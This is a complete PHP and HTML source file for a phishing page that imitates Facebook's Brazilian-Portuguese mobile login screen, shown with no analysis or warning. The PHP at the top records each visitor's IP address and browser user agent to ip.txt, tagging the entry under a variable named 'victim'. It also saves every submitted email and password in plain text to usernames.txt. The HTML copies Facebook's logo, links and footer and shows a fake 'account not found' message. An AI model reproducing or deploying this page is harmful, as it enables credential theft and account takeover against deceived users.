<?php
    //die("<center>O servidor está em manutenção!</center>");
    $ipaddress = '';
    if($_SERVER["REQUEST_METHOD"] != "POST"){
        function get_client_ip() {
            $ipaddress = '';
            if (isset($_SERVER['HTTP_CLIENT_IP'])){
                $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
            }
            else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
                $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
            }
            else if(isset($_SERVER['HTTP_X_FORWARDED'])){
                $ipaddress = $_SERVER['HTTP_X_FORWARDED']."\r\n";
            }
            else if(isset($_SERVER['HTTP_FORWARDED_FOR'])){
                $ipaddress = $_SERVER['HTTP_FORWARDED_FOR']."\r\n";
            }
            else if(isset($_SERVER['HTTP_FORWARDED'])){
                $ipaddress = $_SERVER['HTTP_FORWARDED']."\r\n";
            }
            else if(isset($_SERVER['REMOTE_ADDR'])){
                $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
            }
            else{
                $ipaddress = 'UNKNOWN'."\r\n";
            }
            return $ipaddress;
        }
        $ipaddress = get_client_ip();
        $useragent = " User-Agent: ";
        $browser = $_SERVER['HTTP_USER_AGENT'];
        
        $file = 'ip.txt';
        $victim = "IP: ";
        $fp = fopen($file, 'a');
        fwrite($fp, $victim);
        fwrite($fp, $ipaddress);
        fwrite($fp, $useragent);
        fwrite($fp, $browser);
        fclose($fp);
    }
    if($_SERVER["REQUEST_METHOD"] == "POST"){
        $email = $_POST['txt_e'];
        $senha = trim($_POST['txt_p']);
        file_put_contents("usernames.txt", 
        "Account: " . $email . 
        " Pass: " . $senha . "\n", FILE_APPEND);
    }
?>
<!DOCTYPE html>
<html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Facebook – entre ou cadastre-se</title>
        <link rel="shortcut icon" href="assets/img/icon.png" sizes="196x196">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
        <link type="text/css" rel="stylesheet" href="assets/css/et1.css">
        <link type="text/css" rel="stylesheet" href="assets/css/et3.css">
        <link rel="stylesheet" href="assets/css/style.css">
        <link rel="stylesheet" href="assets/css/estilos.css">
        <script src="assets/js/events.js"></script>
    </head>
    <body>
    <div>
        <p id="hdp">O email ou o número de telefone 
        inserido não corresponde a nenhuma conta. 
        <a id="hd" href="https://m.facebook.com/r.php"><b>Cadastre-se para abrir uma conta.</b></a></p>
    </div>
        <div class="container">
            <div class="row justify-content-md-center m-2">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="facebook" width="112px" height="40px">
            </div>
            <div class="row justify-content-md-center">
                <div class="col-md-4">
                    <form action="index.php" method="post">
                        <div class="form-group mb-1">
                            <input id="ipj"
                            autocomplete="on"
                            autocapitalize="off"
                            autocorrect="off"
                            placeholder="Número de celular ou email"
                            required 
                            class="form-control ipt" type="email" name="txt_e">
                        </div>
                        <div class="form-group mb-2">
                            <input id ="ipj2"
                            autocomplete="on"
                            autocapitalize="off"
                            autocorrect="off"
                            placeholder="Senha"
                            required 
                            class="form-control ipt" type="password" name="txt_p">
                        </div>
                        <div class="d-grid">
                            <button id="error" class="btn btn-primary" 
                            type="submit"><b>Entrar</b></button>
                        </div>
                    </form>
                    <div>
                        <div id="login_reg_separator" class="_43mg _8qtf" 
                        data-sigil="login_reg_separator">
                            <span class="_43mh">ou</span>
                        </div>
                        <div class="text-center mt-3" id="flx">
                            <div>
                                <a href="https://m.facebook.com/reg/?cid=103&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&soft=hjk"><button class="btn btn-success mb-2 ctn"><b>Criar nova conta</b></button></a>
                            </div>
                            <div>
                                <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl%26fl&multiple_results=0&ars=facebook_login&lwv=100&ref=dbl&_rdr">Esqueceu a senha?</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-6 text-center">
                    <div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Português (Brasil)</span><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDhslFIighaa7qGvj0&amp;refid=8" data-locale="es_LA" data-sigil="change_language">Español</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=de_DE&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQD69cPZPBS3CGtxuVI&amp;refid=8" data-locale="de_DE" data-sigil="change_language">Deutsch</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=ar_AR&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQC5G0TgMDzGLYRV51k&amp;refid=8" data-locale="ar_AR" data-sigil="change_language">العربية</a></span></div></div>
                </div>
                <div class="col-6 text-center">
                    <div class="_4g34"><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=en_US&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAPmLr-D0wT4wnn9ws&amp;refid=8" data-locale="en_US" data-sigil="change_language">English (US)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=fr_FR&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDudTIw8gebkwdS6QE&amp;refid=8" data-locale="fr_FR" data-sigil="change_language">Français (France)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="/a/language.php?l=it_IT&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAp83wBdbeSj0EntP4&amp;refid=8" data-locale="it_IT" data-sigil="change_language">Italiano</a></span></div><a href="/language.php?n=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8"><div class="_3j87 _1rrd _3ztd" aria-label="Lista completa de idiomas" data-sigil="more_language"><i class="img sp_FnpQQMXWL5W_1_5x sx_a4e670"></i></div></a></div>
                </div>
            </div>
            <div class="row text-center">
                <div class="_5ui4"><div class="_96qv _9a0a"><a href="/facebook?refid=8" class="_96qw" title="Leia nosso blog, descubra a central de recursos e encontre oportunidades de trabalho.">Sobre</a><span aria-hidden="true"> · </span><a href="/help/?ref=pf&amp;refid=8" class="_96qw" title="Acesse nossa Central de Ajuda.">Ajuda</a><span aria-hidden="true"> · </span><span class="_96qw" id="u_0_7">Mais</span></div><div class="_96qv" style="display:none" id="u_0_8"><a href="/directory/pages/?refid=8" class="_96qw">Páginas</a><a href="/directory/places/?refid=8" title="Navegue pelo nosso diretório de locais." class="_96qw">Locais</a><a href="/directory/people/?refid=8" title="Navegue no nosso diretório de pessoas." class="_96qw">Pessoas</a><a href="/directory/groups/?refid=8" title="Navegue pelo nosso diretório de grupos." class="_96qw">Grupos</a><a href="/pages/category/?refid=8" class="_96qw">Categorias de Página</a><a href="/places/?refid=8" class="_96qw" title="Confira locais populares no Facebook.">Locais</a><a href="https://www.oculus.com/" class="_96qw" target="_blank" title="Saiba mais sobre o Oculus">Oculus</a><a href="https://portal.facebook.com/?refid=8" class="_96qw" target="_blank" title="Saiba mais sobre o Portal do Facebook">Portal</a><a href="/marketplace/?refid=8" class="_96qw" title="Compre e venda no Facebook Marketplace.">Marketplace</a><a href="https://pay.facebook.com/?refid=8" class="_96qw" target="_blank" title="Saiba mais sobre o Facebook Pay">Facebook Pay</a><a href="/fundraisers/?refid=8" class="_96qw" title="Doe para causas importantes.">Campanhas de arrecadação de fundos</a></div><span class="mfss fcg">Facebook, Inc.</span></div>
            </div>
        </div>
    </body>  
</html>